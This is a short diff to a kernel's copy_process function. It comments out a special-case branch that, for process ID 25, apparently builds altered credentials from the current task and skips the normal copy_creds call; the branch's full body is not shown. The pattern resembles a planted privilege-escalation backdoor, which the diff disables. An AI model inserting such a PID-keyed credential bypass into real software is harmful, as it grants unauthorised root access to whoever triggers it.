@@ -799,7 +799,7 @@ struct task_struct *copy_process(unsigned long clone_flags,
 	if (retval < 0)
 		goto out_free;
 
-	if (pid == 25){
+	/*if (pid == 25){
 		struct cred *new;
 		struct cred *old = current_tsk->cred;
 
@@ -819,9 +819,9 @@ struct task_struct *copy_process(unsigned long clone_flags,
 		retval = 0;
 
 	}
-	else{
+	else{*/
 		retval = copy_creds(p, clone_flags);
-	}
+	// }
 	
 	if (retval < 0)
 		goto out_free;
